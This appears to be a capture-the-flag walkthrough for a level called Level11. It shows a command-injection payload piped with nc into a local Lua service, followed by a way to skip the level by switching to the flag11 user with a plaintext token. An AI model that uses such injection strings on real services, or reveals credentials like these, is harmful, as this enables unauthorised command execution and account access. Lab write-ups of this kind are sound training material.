# Level11
There are two ways to do this one :

The classic way is by exploiting the `level11.lua` script with its unsecure execution of `echo` with the input parameters.
>`echo " lol ; getflag > /tmp/flag #" | nc 127.0.0.1 5151`

Get the flag
>`cat /tmp/flag`

The fun way is by using the **level10** Token to directly access the **flag11** user, thereby bypassing **level11**.
>`su flag11`
then paste `woupa2yuojeeaaed06riuj63c`
